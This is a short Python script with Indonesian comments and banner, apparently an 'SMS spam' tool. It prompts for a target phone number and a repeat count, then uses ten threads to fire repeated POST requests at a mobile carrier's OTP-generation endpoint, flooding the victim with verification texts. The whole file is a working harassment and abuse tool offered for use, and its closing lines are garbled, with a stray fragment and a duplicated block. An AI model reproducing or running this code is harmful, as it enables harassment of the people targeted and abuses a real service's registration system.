#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by A'Initial
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
     _  _               ____          ____       _________
   _| || |_           /        \      /       /     |                |        \033[1;32mSEPAM ESEMES (UPDATE)\033[1;36m
  |_  ..  _|        /     ,      \  /       /       |       |        |
  |_      _|       /     / \      '        /        |       |        |         \033[1;31mContact=>https://facebook.com/Mas Al voltHz[1;36m
    |_||_|       /___/     \_____/           |_________|         \033[1;31mGithub=>https://github.com/MrAinitial
""")


os.system('clear')
print(banner)
no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
tot = int(input("\033[1;37mJumlah Spam =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] Sukses Cok")
		else:
			print("\033[1;31m[-] MAMPOD GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)d(x)
p=ThreadPool(10)
p.map(main,jobs)